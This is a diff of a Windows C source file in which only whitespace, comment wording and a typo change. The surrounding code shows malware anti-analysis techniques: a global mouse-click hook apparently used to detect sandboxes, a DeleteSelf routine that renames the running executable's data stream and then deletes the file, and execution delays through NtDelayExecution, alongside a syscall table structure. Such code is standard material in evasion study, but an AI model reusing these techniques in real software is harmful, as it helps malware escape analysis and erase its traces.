@@ -6,7 +6,8 @@
 
 // Global hook handle variable
 HHOOK g_hMouseHook = NULL;
-// global mouse clicks counter
+
+// Global mouse clicks counter
 DWORD g_dwMouseClicks = NULL;
 
 extern VX_TABLE g_Sys;
@@ -23,8 +24,6 @@ LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {
 
 	return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
 }
-
-
 
 BOOL MouseClicksLogger() {
 
@@ -51,9 +50,7 @@ BOOL MouseClicksLogger() {
 	return TRUE;
 }
 
-
 BOOL DeleteSelf() {
-
 
 	WCHAR				    szPath[MAX_PATH * 2] = { 0 };
 	FILE_DISPOSITION_INFO	Delete = { 0 };
@@ -84,7 +81,6 @@ BOOL DeleteSelf() {
 	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
 
 	//--------------------------------------------------------------------------------------------------------------------------
-
 	// Used to get the current file name
 	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
 #if DEBUG
@@ -95,7 +91,6 @@ BOOL DeleteSelf() {
 
 	//--------------------------------------------------------------------------------------------------------------------------
 	// RENAMING
-
 	// Opening a handle to the current file
 	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -122,8 +117,7 @@ BOOL DeleteSelf() {
 	CloseHandle(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
-	// DELEING
-
+	// DELETING
 	// Opening a new handle to the current file
 	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
@@ -155,19 +149,16 @@ BOOL DeleteSelf() {
 	CloseHandle(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
-
 	// Freeing the allocated buffer
 	HeapFree(GetProcessHeap(), 0, pRename);
 
 	return TRUE;
 }
 
-
-
 typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
 	BOOLEAN              Alertable,
 	PLARGE_INTEGER       DelayInterval
-	);
+);
 
 BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 
